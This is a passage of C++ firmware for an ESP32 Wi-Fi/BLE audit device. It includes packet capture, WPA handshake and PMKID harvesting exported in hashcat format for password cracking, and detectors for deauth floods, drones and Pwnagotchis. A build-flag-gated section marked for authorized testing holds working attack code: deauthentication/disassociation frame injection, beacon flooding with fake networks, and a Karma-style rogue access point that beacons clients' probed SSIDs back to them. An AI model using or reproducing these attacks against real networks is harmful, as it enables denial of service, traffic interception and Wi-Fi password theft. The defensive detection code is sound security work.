constexpr uint32_t PCAP_RECORD_HEADER = 16;  // ts_sec, ts_usec, incl_len, orig_len

struct PcapRing {
  volatile bool active;
  volatile uint32_t head;     // producer write offset
  volatile uint32_t tail;     // consumer read offset
  volatile uint32_t packets;  // frames accepted
  volatile uint32_t drops;    // frames dropped (ring full)
  uint8_t* buf;               // backing store (heap, allocated only while capturing)
};
PcapRing g_pcap;
// The 32 KB ring lives on the heap only during a PCAP capture. Keeping it in
// permanent .bss starved the BLE controller (OOM crash during BLE scans).
std::unique_ptr<uint8_t[]> g_pcapBuf;

// Copy n bytes into the ring starting at offset `at`, wrapping at the end.
void pcapRingWrite(uint32_t at, const uint8_t* src, uint32_t n) {
  const uint32_t firstChunk = std::min(n, PCAP_RING_SIZE - at);
  memcpy(g_pcap.buf + at, src, firstChunk);
  if (n > firstChunk) memcpy(g_pcap.buf, src + firstChunk, n - firstChunk);
}

void pcapPromiscuousCb(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (!g_pcap.active || !g_pcap.buf) return;
  const wifi_promiscuous_pkt_t* pkt = static_cast<const wifi_promiscuous_pkt_t*>(buf);
  uint32_t len = pkt->rx_ctrl.sig_len;
  if (len < 4) return;
  len -= 4;  // strip the 4-byte FCS the radio appends
  if (len > PCAP_SNAPLEN) len = PCAP_SNAPLEN;
  const uint32_t total = PCAP_RECORD_HEADER + len;

  const uint32_t head = g_pcap.head;
  const uint32_t used = (head - g_pcap.tail) & PCAP_RING_MASK;
  if (PCAP_RING_SIZE - 1 - used < total) {
    g_pcap.drops++;
    return;
  }

  const uint64_t us = static_cast<uint64_t>(esp_timer_get_time());
  const uint32_t tsSec = static_cast<uint32_t>(us / 1000000ULL);
  const uint32_t tsUsec = static_cast<uint32_t>(us % 1000000ULL);
  uint8_t rec[PCAP_RECORD_HEADER];
  memcpy(rec + 0, &tsSec, 4);
  memcpy(rec + 4, &tsUsec, 4);
  memcpy(rec + 8, &len, 4);   // incl_len (captured)
  memcpy(rec + 12, &len, 4);  // orig_len

  pcapRingWrite(head, rec, PCAP_RECORD_HEADER);
  pcapRingWrite((head + PCAP_RECORD_HEADER) & PCAP_RING_MASK, pkt->payload, len);
  g_pcap.head = (head + total) & PCAP_RING_MASK;  // publish only after full record
  g_pcap.packets++;
}

// Drain all currently-published bytes to the open file. Returns bytes written.
uint32_t pcapDrain(HalFile& file) {
  const uint32_t tail = g_pcap.tail;
  const uint32_t used = (g_pcap.head - tail) & PCAP_RING_MASK;
  if (used == 0) return 0;
  const uint32_t firstChunk = std::min(used, PCAP_RING_SIZE - tail);
  file.write(g_pcap.buf + tail, firstChunk);
  if (used > firstChunk) file.write(g_pcap.buf, used - firstChunk);
  g_pcap.tail = (tail + used) & PCAP_RING_MASK;
  return used;
}

// ---- WPA handshake / PMKID capture (passive) ----
// Detects EAPOL-Key M1/M2 and RSN PMKID in promiscuous frames and exports the
// hashcat 22000 format. The callback only parses + memcpy's into static slots
// (no SD I/O in Wi-Fi context); the activity loop writes completed lines.
//
// Hardening: every read into the attacker-controlled frame is bounds-checked
// against the captured length before dereferencing.
constexpr const char* HS_DIR = "/.radioink/captures";
constexpr int HS_MAX_SLOTS = 8;
constexpr int HS_SSID_MAX = 16;
constexpr int HS_EAPOL_MAX = 256;
constexpr int EAPOL_FIXED_LEN = 99;  // EAPOL hdr(4) + key descriptor up to key-data-len

struct HsSsidEntry {
  bool used;
  uint8_t bssid[6];
  char ssid[33];
  uint8_t channel;
  int8_t rssi;
};

struct HsSlot {
  bool used;
  uint8_t ap[6];
  uint8_t sta[6];
  bool haveM1;
  uint8_t anonce[32];
  uint8_t replayM1[8];
  bool havePmkid;
  uint8_t pmkid[16];
  bool haveM2;
  uint8_t mic[16];
  uint8_t replayM2[8];
  uint16_t eapolLen;
  uint8_t eapol[HS_EAPOL_MAX];
  bool pmkidWritten;
  bool eapolWritten;
};

struct HandshakeCapture {
  volatile bool active;
  HsSsidEntry ssids[HS_SSID_MAX];
  HsSlot slots[HS_MAX_SLOTS];
  volatile uint16_t beaconCount;
};
std::unique_ptr<HandshakeCapture> g_hs;  // allocated only during a handshake capture

HsSsidEntry* hsFindSsid(const uint8_t* bssid) {
  for (auto& e : g_hs->ssids)
    if (e.used && macEq(e.bssid, bssid)) return &e;
  return nullptr;
}
void hsStoreSsid(const uint8_t* bssid, const char* ssid, uint8_t channel, int8_t rssi) {
  if (!ssid[0]) return;
  if (auto* e = hsFindSsid(bssid)) {
    if (!e->ssid[0]) {
      strncpy(e->ssid, ssid, 32);
      e->ssid[32] = '\0';
    }
    e->channel = channel;
    e->rssi = rssi;
    return;
  }
  for (auto& e : g_hs->ssids) {
    if (!e.used) {
      e.used = true;
      memcpy(e.bssid, bssid, 6);
      strncpy(e.ssid, ssid, 32);
      e.ssid[32] = '\0';
      e.channel = channel;
      e.rssi = rssi;
      return;
    }
  }
}
// Strongest AP seen via beacons this capture — the default in-screen deauth target.
HsSsidEntry* hsBestAp() {
  HsSsidEntry* best = nullptr;
  for (auto& e : g_hs->ssids)
    if (e.used && e.ssid[0] && (!best || e.rssi > best->rssi)) best = &e;
  return best;
}
HsSlot* hsFindSlot(const uint8_t* ap, const uint8_t* sta) {
  for (auto& s : g_hs->slots)
    if (s.used && macEq(s.ap, ap) && macEq(s.sta, sta)) return &s;
  for (auto& s : g_hs->slots) {
    if (!s.used) {
      memset(&s, 0, sizeof(s));
      s.used = true;
      memcpy(s.ap, ap, 6);
      memcpy(s.sta, sta, 6);
      return &s;
    }
  }
  return nullptr;  // table full
}

void hsWritePmkidLine(HalFile& file, const HsSlot& s, const char* ssid) {
  const std::string line = "WPA*01*" + bytesToHex(s.pmkid, 16) + "*" + bytesToHex(s.ap, 6) + "*" +
                           bytesToHex(s.sta, 6) + "*" + strToHex(ssid) + "***\n";
  file.write(reinterpret_cast<const uint8_t*>(line.data()), line.size());
}
void hsWriteEapolLine(HalFile& file, const HsSlot& s, const char* ssid) {
  const std::string line = "WPA*02*" + bytesToHex(s.mic, 16) + "*" + bytesToHex(s.ap, 6) + "*" + bytesToHex(s.sta, 6) +
                           "*" + strToHex(ssid) + "*" + bytesToHex(s.anonce, 32) + "*" +
                           bytesToHex(s.eapol, s.eapolLen) + "*00\n";
  file.write(reinterpret_cast<const uint8_t*>(line.data()), line.size());
}

void handshakePromiscuousCb(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (!g_hs || !g_hs->active) return;
  PromiscFrame fr;
  if (!parsePromiscFrame(buf, fr)) return;
  const uint8_t* p = fr.p;
  const int len = fr.len;
  const uint8_t ftype = fr.ftype;
  const uint8_t fsub = fr.fsub;

  // Beacons / probe responses: harvest BSSID -> SSID so exports have the ESSID.
  if (ftype == 0 && (fsub == 8 || fsub == 5)) {
    const uint8_t* bssid = p + 16;  // addr3
    char ssid[33];
    ssid[0] = '\0';
    int off = 24 + 12;  // 802.11 header + fixed beacon params, then tagged IEs
    while (off + 2 <= len) {
      const uint8_t tag = p[off];
      const uint8_t tlen = p[off + 1];
      if (off + 2 + tlen > len) break;
      if (tag == 0) {  // SSID IE
        const int n = tlen > 32 ? 32 : tlen;
        memcpy(ssid, p + off + 2, n);
        ssid[n] = '\0';
        break;
      }
      off += 2 + tlen;
    }
    hsStoreSsid(bssid, ssid, fr.channel, fr.rssi);
    g_hs->beaconCount++;
    return;
  }

  // Data frames carrying EAPOL (LLC/SNAP 0xAAAA03 000000 888E).
  if (ftype != 2) return;
  const bool toDS = p[1] & 0x01;
  const bool fromDS = p[1] & 0x02;
  int hdr = 24;
  if (fsub & 0x08) hdr += 2;  // QoS Data has a 2-byte QoS Control field
  if (hdr + 8 > len) return;
  const uint8_t* llc = p + hdr;
  if (!(llc[0] == 0xAA && llc[1] == 0xAA && llc[2] == 0x03 && llc[3] == 0x00 && llc[4] == 0x00 && llc[5] == 0x00 &&
        llc[6] == 0x88 && llc[7] == 0x8E))
    return;

  const uint8_t* eapol = llc + 8;
  const int eapolLen = len - hdr - 8;
  if (eapolLen < EAPOL_FIXED_LEN) return;  // need the fixed EAPOL-Key fields
  if (eapol[1] != 3) return;               // EAPOL packet type 3 = Key

  const uint16_t keyInfo = (static_cast<uint16_t>(eapol[5]) << 8) | eapol[6];
  const bool kAck = keyInfo & 0x0080;
  const bool kMic = keyInfo & 0x0100;

  uint8_t ap[6], sta[6];
  if (fromDS && !toDS) {  // AP -> STA (M1, M3)
    memcpy(ap, p + 10, 6);
    memcpy(sta, p + 4, 6);
  } else if (toDS && !fromDS) {  // STA -> AP (M2, M4)
    memcpy(ap, p + 4, 6);
    memcpy(sta, p + 10, 6);
  } else {
    return;
  }

  HsSlot* slot = hsFindSlot(ap, sta);
  if (!slot) return;

  const uint8_t* nonce = eapol + 17;
  const uint8_t* replay = eapol + 9;
  const uint16_t kdLen = (static_cast<uint16_t>(eapol[97]) << 8) | eapol[98];

  if (kAck && !kMic) {
    // M1 (from AP): ANONCE, and possibly a PMKID in the key data.
    memcpy(slot->anonce, nonce, 32);
    memcpy(slot->replayM1, replay, 8);
    slot->haveM1 = true;
    if (kdLen > 0 && EAPOL_FIXED_LEN + kdLen <= eapolLen) {
      const uint8_t* kd = eapol + EAPOL_FIXED_LEN;
      int i = 0;
      while (i + 2 <= kdLen) {
        const uint8_t tag = kd[i];
        const uint8_t tl = kd[i + 1];
        if (i + 2 + tl > kdLen) break;
        // PMKID KDE: DD <len> 00 0F AC 04 <16-byte PMKID>
        if (tag == 0xDD && tl >= 0x14 && kd[i + 2] == 0x00 && kd[i + 3] == 0x0F && kd[i + 4] == 0xAC &&
            kd[i + 5] == 0x04) {
          memcpy(slot->pmkid, kd + i + 6, 16);
          bool nonZero = false;
          for (int z = 0; z < 16; z++)
            if (slot->pmkid[z]) {
              nonZero = true;
              break;
            }
          if (nonZero) slot->havePmkid = true;
          break;
        }
        i += 2 + tl;
      }
    }
  } else if (kMic && !kAck && kdLen > 0) {
    // M2 (from STA): MIC + the EAPOL frame used for cracking (MIC field zeroed).
    memcpy(slot->replayM2, replay, 8);
    memcpy(slot->mic, eapol + 81, 16);
    int copyLen = EAPOL_FIXED_LEN + kdLen;
    if (copyLen > eapolLen) copyLen = eapolLen;
    if (copyLen > HS_EAPOL_MAX) copyLen = HS_EAPOL_MAX;
    memcpy(slot->eapol, eapol, copyLen);
    if (copyLen >= 97) memset(slot->eapol + 81, 0, 16);  // zero MIC for hc22000
    slot->eapolLen = static_cast<uint16_t>(copyLen);
    slot->haveM2 = true;
  }
}

// ---- Deauth / disassoc flood detector (passive, defensive) ----
// Counts management deauth (subtype 12) / disassoc (subtype 10) frames per
// transmitter while channel-hopping. A handful is normal; a sustained burst from
// one source is the signature of a deauth attack. The callback only tallies into
// static slots (no SD I/O in Wi-Fi context); the activity loop writes alerts.
constexpr int DD_MAX_SLOTS = 16;
constexpr uint16_t DD_ALERT_THRESHOLD = 16;  // frames from one source before flagging

struct DeauthSrc {
  bool used;
  uint8_t src[6];    // addr2 (transmitter)
  uint8_t bssid[6];  // addr3
  volatile uint16_t deauthCount;
  volatile uint16_t disassocCount;
  volatile int8_t lastRssi;
  volatile uint8_t lastChannel;
  bool reported;  // alert line already written for this source
};

struct DeauthDetect {
  volatile bool active;
  DeauthSrc slots[DD_MAX_SLOTS];
  volatile uint32_t totalFrames;
};
std::unique_ptr<DeauthDetect> g_dd;  // allocated only while the detector runs

void deauthDetectCb(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (!g_dd || !g_dd->active) return;
  if (type != WIFI_PKT_MGMT) return;
  PromiscFrame fr;
  if (!parsePromiscFrame(buf, fr)) return;
  const uint8_t* p = fr.p;
  const uint8_t ftype = fr.ftype;
  const uint8_t fsub = fr.fsub;
  if (ftype != 0) return;                // management frames only
  if (fsub != 12 && fsub != 10) return;  // 12 = deauth, 10 = disassoc

  const uint8_t* src = p + 10;    // addr2 transmitter
  const uint8_t* bssid = p + 16;  // addr3
  g_dd->totalFrames++;

  DeauthSrc* slot = nullptr;
  for (auto& s : g_dd->slots) {
    if (s.used && macEq(s.src, src)) {
      slot = &s;
      break;
    }
  }
  if (!slot) {
    for (auto& s : g_dd->slots) {
      if (!s.used) {
        s.used = true;
        memcpy(s.src, src, 6);
        memcpy(s.bssid, bssid, 6);
        s.deauthCount = 0;
        s.disassocCount = 0;
        s.reported = false;
        slot = &s;
        break;
      }
    }
  }
  if (!slot) return;  // table full -- ignore further new sources

  if (fsub == 12)
    slot->deauthCount++;
  else
    slot->disassocCount++;
  slot->lastRssi = fr.rssi;
  slot->lastChannel = fr.channel;
}

// ---- Drone Remote ID monitor (OpenDroneID / ASTM F3411, passive) ----
// Parses the ASTM vendor-specific IE (OUI FA:0B:BC, type 0x0D) carried in Wi-Fi
// beacons by FAA-compliant drones, decoding the Basic ID (serial) and Location
// (lat/lon/altitude) messages. The callback only writes fixed slots (no heap/SD
// in Wi-Fi context); the loop refreshes the screen. BLE-broadcast Remote ID is
// caught separately by ra::droneBleReason() in the BLE classifiers.
constexpr int DRONE_MAX_SLOTS = 8;

struct DroneEntry {
  bool used;
  uint8_t mac[6];  // beacon transmitter (addr2)
  char id[21];     // ODID UAS ID (serial), NUL-terminated
  uint8_t uaType;  // UA type (0..15)
  bool haveId;
  bool haveLoc;
  int32_t latE7;  // latitude  * 1e7 (degrees)
  int32_t lonE7;  // longitude * 1e7
  int16_t altM;   // geodetic altitude (m)
  volatile int8_t rssi;
  volatile uint8_t channel;
};

struct DroneScanState {
  volatile bool active;
  DroneEntry slots[DRONE_MAX_SLOTS];
  volatile uint32_t beaconsSeen;
  volatile uint32_t odidFrames;
};
std::unique_ptr<DroneScanState> g_drone;  // allocated only while the monitor runs

// Decode one 25-byte ODID message into the slot (Basic ID + Location only).
inline void odidParseMessage(DroneEntry* slot, const uint8_t* m) {
  const uint8_t mtype = m[0] >> 4;
  if (mtype == 0) {  // Basic ID
    slot->uaType = m[1] & 0x0F;
    memcpy(slot->id, m + 2, 20);
    slot->id[20] = '\0';
    for (int z = 0; z < 20; z++)  // sanitize non-printable bytes for display
      if (slot->id[z] && (slot->id[z] < 0x20 || slot->id[z] > 0x7E)) slot->id[z] = '.';
    slot->haveId = true;
  } else if (mtype == 1) {  // Location / Vector
    int32_t lat, lon;
    memcpy(&lat, m + 5, 4);  // little-endian, memcpy for RISC-V alignment
    memcpy(&lon, m + 9, 4);
    uint16_t altEnc;
    memcpy(&altEnc, m + 15, 2);  // geodetic altitude, encoded
    slot->latE7 = lat;
    slot->lonE7 = lon;
    slot->altM = static_cast<int16_t>(static_cast<int>(altEnc) / 2 - 1000);  // ODID: enc*0.5 - 1000
    slot->haveLoc = true;
  }
}

// Ingest an ODID message-pack (or a single message) from a vendor IE body.
inline void odidIngest(const uint8_t* d, int dlen, const uint8_t* mac, int8_t rssi, uint8_t channel) {
  if (dlen < 1) return;
  const uint8_t* msgs;
  int count;
  if ((d[0] >> 4) == 0x0F) {  // message pack header
    if (dlen < 3 || d[1] != 25) return;
    count = d[2];
    msgs = d + 3;
    const int avail = (dlen - 3) / 25;
    if (count > avail) count = avail;
  } else {  // a single 25-byte message
    if (dlen < 25) return;
    msgs = d;
    count = 1;
  }
  if (count <= 0) return;
  if (count > DRONE_MAX_SLOTS * 2) count = DRONE_MAX_SLOTS * 2;  // sanity cap

  DroneEntry* slot = nullptr;
  for (auto& s : g_drone->slots)
    if (s.used && macEq(s.mac, mac)) {
      slot = &s;
      break;
    }
  if (!slot) {
    for (auto& s : g_drone->slots)
      if (!s.used) {
        s = DroneEntry{};
        s.used = true;
        memcpy(s.mac, mac, 6);
        slot = &s;
        break;
      }
  }
  if (!slot) return;  // table full
  slot->rssi = rssi;
  slot->channel = channel;
  for (int k = 0; k < count; k++) {
    const int off = static_cast<int>(msgs - d) + k * 25;
    if (off + 25 > dlen) break;
    odidParseMessage(slot, msgs + k * 25);
  }
  g_drone->odidFrames++;
}

void droneScanCb(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (!g_drone || !g_drone->active) return;
  if (type != WIFI_PKT_MGMT) return;
  PromiscFrame fr;
  if (!parsePromiscFrame(buf, fr)) return;
  if (fr.ftype != 0) return;                 // management
  if (fr.fsub != 8 && fr.fsub != 5) return;  // beacon (8) or probe response (5)
  const uint8_t* p = fr.p;
  const int len = fr.len;
  if (len < 38) return;
  g_drone->beaconsSeen++;

  // Tagged IEs start after the 24-byte header + 12-byte fixed beacon params.
  int i = 36;
  while (i + 2 <= len) {
    const uint8_t tag = p[i];
    const int ielen = p[i + 1];
    if (i + 2 + ielen > len) break;
    const uint8_t* ie = p + i + 2;
    // Vendor-specific ASTM OpenDroneID: OUI FA:0B:BC, vendor type 0x0D, then a
    // 1-byte message counter, then the message pack.
    if (tag == 0xDD && ielen >= 6 && ie[0] == 0xFA && ie[1] == 0x0B && ie[2] == 0xBC && ie[3] == 0x0D) {
      odidIngest(ie + 5, ielen - 5, p + 10, fr.rssi, fr.channel);
    }
    i += 2 + ielen;
  }
}

// ---- Pwnagotchi beacon sniffer (passive) ----
// A normal scanNetworks misses Pwnagotchi's sparse presence beacons, so the Threat
// Sweep does a brief promiscuous beacon listen and flags the two signatures: a
// DE:AD:BE:EF source/BSSID, or a JSON-identity payload in the SSID field.
constexpr int PWN_MAX_SLOTS = 8;
struct PwnHit {
  bool used;
  uint8_t mac[6];  // transmitter (addr2)
  char ssid[24];   // SSID snippet (NUL-terminated)
  int8_t rssi;
};
struct PwnScan {
  volatile bool active;
  PwnHit slots[PWN_MAX_SLOTS];
  volatile uint32_t beacons;
};
std::unique_ptr<PwnScan> g_pwn;

void pwnScanCb(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (!g_pwn || !g_pwn->active) return;
  if (type != WIFI_PKT_MGMT) return;
  PromiscFrame fr;
  if (!parsePromiscFrame(buf, fr)) return;
  if (fr.ftype != 0) return;
  if (fr.fsub != 8 && fr.fsub != 5) return;  // beacon / probe response
  const uint8_t* p = fr.p;
  const int len = fr.len;
  if (len < 38) return;
  g_pwn->beacons++;

  const uint8_t* addr2 = p + 10;  // transmitter
  const uint8_t* addr3 = p + 16;  // BSSID
  auto isDeadBeef = [](const uint8_t* m) { return m[0] == 0xDE && m[1] == 0xAD && m[2] == 0xBE && m[3] == 0xEF; };
  bool sig = isDeadBeef(addr2) || isDeadBeef(addr3);

  // First IE is the SSID (tag 0) at offset 36.
  char ssid[24] = {0};
  if (p[36] == 0x00) {
    int sl = p[37];
    if (sl > static_cast<int>(sizeof(ssid)) - 1) sl = sizeof(ssid) - 1;
    if (38 + sl <= len && sl > 0) memcpy(ssid, p + 38, sl);
  }
  if (!sig && ssid[0] == '{') sig = true;  // Pwnagotchi JSON identity payload

  if (!sig) return;
  for (auto& s : g_pwn->slots)
    if (s.used && macEq(s.mac, addr2)) return;  // already recorded
  for (auto& s : g_pwn->slots)
    if (!s.used) {
      s.used = true;
      memcpy(s.mac, addr2, 6);
      memcpy(s.ssid, ssid, sizeof(ssid));
      s.rssi = fr.rssi;
      break;
    }
}

#if defined(RADIO_AUDIT_ENABLE_ACTIVE)
// ---- Active attacks (deauth / beacon flood) ----
// Authorized testing only. Gated behind RADIO_AUDIT_ENABLE_ACTIVE + a one-time
// per-session confirmation. Persists for the process lifetime (until reboot).
bool g_activeAuthorized = false;
const uint8_t BROADCAST_MAC[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

uint8_t g_deauthFrame[26] = {
    0xC0, 0x00,                          // FC: mgmt, subtype 12 (deauth)
    0x00, 0x00,                          // duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // [4]  DA (target client / broadcast)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // [10] SA = AP BSSID
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // [16] BSSID = AP
    0x00, 0x00,                          // seq
    0x07, 0x00,                          // reason 7 (class-3 frame from nonassoc STA)
};
uint8_t g_beaconFrame[128];

// Inject `rounds` deauth + disassoc frames spoofing `ap` toward `client`
// (broadcast kicks every associated station). Caller sets the channel first.
int sendDeauthBurst(const uint8_t* ap, const uint8_t* client, int rounds) {
  memcpy(g_deauthFrame + 4, client, 6);
  memcpy(g_deauthFrame + 10, ap, 6);
  memcpy(g_deauthFrame + 16, ap, 6);
  int sent = 0;
  for (int r = 0; r < rounds; r++) {
    g_deauthFrame[0] = 0xC0;  // deauth
    if (esp_wifi_80211_tx(WIFI_IF_STA, g_deauthFrame, sizeof(g_deauthFrame), false) == ESP_OK) sent++;
    g_deauthFrame[0] = 0xA0;  // disassoc
    if (esp_wifi_80211_tx(WIFI_IF_STA, g_deauthFrame, sizeof(g_deauthFrame), false) == ESP_OK) sent++;
  }
  return sent;
}

// Transmit `rounds` beacons with random BSSIDs/SSIDs on the current channel.
int sendBeaconFlood(uint8_t channel, int rounds) {
  int sent = 0;
  for (int r = 0; r < rounds; r++) {
    int i = 0;
    g_beaconFrame[i++] = 0x80;  // FC: beacon
    g_beaconFrame[i++] = 0x00;
    g_beaconFrame[i++] = 0x00;  // duration
    g_beaconFrame[i++] = 0x00;
    for (int j = 0; j < 6; j++) g_beaconFrame[i++] = 0xFF;  // DA broadcast
    const uint8_t src[6] = {0x00,
                            0x16,
                            0x3e,
                            static_cast<uint8_t>(esp_random()),
                            static_cast<uint8_t>(esp_random()),
                            static_cast<uint8_t>(esp_random())};
    memcpy(g_beaconFrame + i, src, 6);  // SA
    i += 6;
    memcpy(g_beaconFrame + i, src, 6);  // BSSID
    i += 6;
    g_beaconFrame[i++] = 0x00;  // seq
    g_beaconFrame[i++] = 0x00;
    memset(g_beaconFrame + i, 0, 8);  // timestamp
    i += 8;
    g_beaconFrame[i++] = 0x64;  // beacon interval 100 TU
    g_beaconFrame[i++] = 0x00;
    g_beaconFrame[i++] = 0x01;  // capability info (ESS)
    g_beaconFrame[i++] = 0x00;
    char ssid[12];
    const int n = snprintf(ssid, sizeof(ssid), "FREE-%04X", static_cast<unsigned>(esp_random() & 0xFFFF));
    g_beaconFrame[i++] = 0x00;  // SSID IE tag
    g_beaconFrame[i++] = static_cast<uint8_t>(n);
    memcpy(g_beaconFrame + i, ssid, n);
    i += n;
    g_beaconFrame[i++] = 0x01;  // supported rates IE
    g_beaconFrame[i++] = 0x08;
    const uint8_t rates[8] = {0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c};
    memcpy(g_beaconFrame + i, rates, 8);
    i += 8;
    g_beaconFrame[i++] = 0x03;  // DS parameter set (channel)
    g_beaconFrame[i++] = 0x01;
    g_beaconFrame[i++] = channel;
    if (esp_wifi_80211_tx(WIFI_IF_STA, g_beaconFrame, i, false) == ESP_OK) sent++;
  }
  return sent;
}

// ---- Karma / probe-response (active) ----
// Harvest the SSIDs clients probe for (their Preferred Network List), then
// beacon those names back so the clients reveal themselves / attempt to
// associate -- a Karma (a.k.a. MANA) style probe response. The promiscuous
// callback only tallies harvested SSIDs; the attack loop transmits the beacons.
constexpr int KARMA_MAX_SSIDS = 32;
struct KarmaState {
  volatile bool active;
  char ssids[KARMA_MAX_SSIDS][33];
  volatile uint8_t count;
  volatile uint16_t probeReqs;  // directed probe requests seen
};
std::unique_ptr<KarmaState> g_karma;  // allocated only while Karma runs

void karmaProbeCb(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (!g_karma || !g_karma->active) return;
  if (type != WIFI_PKT_MGMT) return;
  PromiscFrame fr;
  if (!parsePromiscFrame(buf, fr)) return;
  const uint8_t* p = fr.p;
  const int len = fr.len;
  if (fr.ftype != 0 || fr.fsub != 4) return;  // probe request only

  // SSID IE (tag 0) is the first tagged field after the 24-byte header.
  const int off = 24;
  if (off + 2 > len) return;
  if (p[off] != 0) return;  // first IE must be SSID
  const uint8_t slen = p[off + 1];
  if (slen == 0 || slen > 32) return;  // broadcast/wildcard or invalid -> ignore
  if (off + 2 + slen > len) return;
  char ssid[33];
  memcpy(ssid, p + off + 2, slen);
  ssid[slen] = '\0';

  g_karma->probeReqs++;
  for (uint8_t k = 0; k < g_karma->count; k++)
    if (strncmp(g_karma->ssids[k], ssid, 33) == 0) return;  // already harvested
  if (g_karma->count < KARMA_MAX_SSIDS) {
    strncpy(g_karma->ssids[g_karma->count], ssid, 32);
    g_karma->ssids[g_karma->count][32] = '\0';
    g_karma->count++;
  }
}

// Transmit one beacon advertising `ssid` on `channel`. The BSSID is derived from
// the SSID so each fake network keeps a stable address across bursts.
int sendKarmaBeacon(uint8_t channel, const char* ssid) {
  const int slen = static_cast<int>(strlen(ssid));
  if (slen <= 0 || slen > 32) return 0;
  int i = 0;
  g_beaconFrame[i++] = 0x80;  // FC: beacon
  g_beaconFrame[i++] = 0x00;
  g_beaconFrame[i++] = 0x00;  // duration
  g_beaconFrame[i++] = 0x00;
  for (int j = 0; j < 6; j++) g_beaconFrame[i++] = 0xFF;  // DA broadcast
  uint8_t bssid[6] = {0x02, 0x00, 0x00, 0x00, 0x00, 0x00};
  for (int j = 0; j < slen; j++) bssid[2 + (j % 4)] ^= static_cast<uint8_t>(ssid[j]);
  memcpy(g_beaconFrame + i, bssid, 6);  // SA
  i += 6;
  memcpy(g_beaconFrame + i, bssid, 6);  // BSSID
  i += 6;
  g_beaconFrame[i++] = 0x00;  // seq
  g_beaconFrame[i++] = 0x00;
  memset(g_beaconFrame + i, 0, 8);  // timestamp
  i += 8;
  g_beaconFrame[i++] = 0x64;  // beacon interval 100 TU
  g_beaconFrame[i++] = 0x00;
  g_beaconFrame[i++] = 0x01;  // capability info (ESS, open)
  g_beaconFrame[i++] = 0x00;
  g_beaconFrame[i++] = 0x00;  // SSID IE tag
  g_beaconFrame[i++] = static_cast<uint8_t>(slen);
  memcpy(g_beaconFrame + i, ssid, slen);
  i += slen;
  g_beaconFrame[i++] = 0x01;  // supported rates IE
  g_beaconFrame[i++] = 0x08;
  const uint8_t rates[8] = {0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c};
  memcpy(g_beaconFrame + i, rates, 8);
  i += 8;
  g_beaconFrame[i++] = 0x03;  // DS parameter set (channel)
  g_beaconFrame[i++] = 0x01;
  g_beaconFrame[i++] = channel;
  return esp_wifi_80211_tx(WIFI_IF_STA, g_beaconFrame, i, false) == ESP_OK ? 1 : 0;
}
#endif  // RADIO_AUDIT_ENABLE_ACTIVE
}  // namespace

// Vendor name for a "AA:BB:CC:.." MAC. Binary-searches the SD OUI database
// (opened in onEnter). Returns a name, "randomized" for locally-administered
// MACs, or "" if unknown / the database is not on the SD card. A small ring
// cache short-circuits repeats so a scan's worth of lookups stays cheap.
namespace ra {
std::string macVendor(const std::string& mac) {
  unsigned int b0, b1, b2;
  if (sscanf(mac.c_str(), "%x:%x:%x", &b0, &b1, &b2) != 3) return "";
  if (b0 & 0x02) return "randomized";  // locally administered -> likely a random MAC
  const uint32_t oui = (b0 << 16) | (b1 << 8) | b2;

  for (const auto& e : g_ouiCache)
    if (e.valid && e.oui == oui) return std::string(e.name);

  std::string result;  // empty = unknown
  if (g_ouiFile.isOpen() && g_ouiCount > 0) {
    int lo = 0, hi = static_cast<int>(g_ouiCount) - 1;
    uint8_t rec[OUI_RECORD_SIZE];
    while (lo <= hi) {
      const int mid = lo + (hi - lo) / 2;
      if (!g_ouiFile.seek(OUI_HEADER_SIZE + static_cast<size_t>(mid) * OUI_RECORD_SIZE)) break;
      if (g_ouiFile.read(rec, OUI_RECORD_SIZE) != static_cast<int>(OUI_RECORD_SIZE)) break;
      uint32_t key;
      memcpy(&key, rec, 4);  // little-endian, matches gen_oui.py
      if (key == oui) {
        rec[OUI_RECORD_SIZE - 1] = '\0';  // guarantee NUL-terminated name
        result.assign(reinterpret_cast<const char*>(rec + 4));
        break;
      }
      if (key < oui)
        lo = mid + 1;
      else
        hi = mid - 1;
    }
  }

  // Cache the result (hit or miss) in the ring so repeats skip the SD search.
  OuiCacheEntry& slot = g_ouiCache[g_ouiCacheNext];
  slot.valid = true;
  slot.oui = oui;
  strncpy(slot.name, result.c_str(), sizeof(slot.name) - 1);
  slot.name[sizeof(slot.name) - 1] = '\0';
  g_ouiCacheNext = (g_ouiCacheNext + 1) % OUI_CACHE_SIZE;
  return result;
}

std::string bleCompanyById(uint16_t id) {
  for (const auto& e : g_bleCompCache)
    if (e.valid && e.id == id) return std::string(e.name);

  std::string result;  // empty = unknown / db absent
  if (g_bleCompFile.isOpen() && g_bleCompCount > 0) {
    int lo = 0, hi = static_cast<int>(g_bleCompCount) - 1;
    uint8_t rec[BLECOMP_RECORD_SIZE];
    while (lo <= hi) {
      const int mid = lo + (hi - lo) / 2;
      if (!g_bleCompFile.seek(BLECOMP_HEADER_SIZE + static_cast<size_t>(mid) * BLECOMP_RECORD_SIZE)) break;
      if (g_bleCompFile.read(rec, BLECOMP_RECORD_SIZE) != static_cast<int>(BLECOMP_RECORD_SIZE)) break;
      uint16_t key;
      memcpy(&key, rec, 2);  // little-endian, matches gen_ble_companies.py
      if (key == id) {
        rec[BLECOMP_RECORD_SIZE - 1] = '\0';
        result.assign(reinterpret_cast<const char*>(rec + 4));  // skip id(2)+pad(2)
        break;
      }
      if (key < id)
        lo = mid + 1;
      else
        hi = mid - 1;
    }
  }

  BleCompCacheEntry& slot = g_bleCompCache[g_bleCompCacheNext];
  slot.valid = true;
  slot.id = id;
  strncpy(slot.name, result.c_str(), sizeof(slot.name) - 1);
  slot.name[sizeof(slot.name) - 1] = '\0';
  g_bleCompCacheNext = (g_bleCompCacheNext + 1) % BLECOMP_CACHE_SIZE;
  return result;
}

std::string bleVendorName(const std::string& manufacturerHex) {
  if (manufacturerHex.size() < 4) return bleCompany(manufacturerHex);
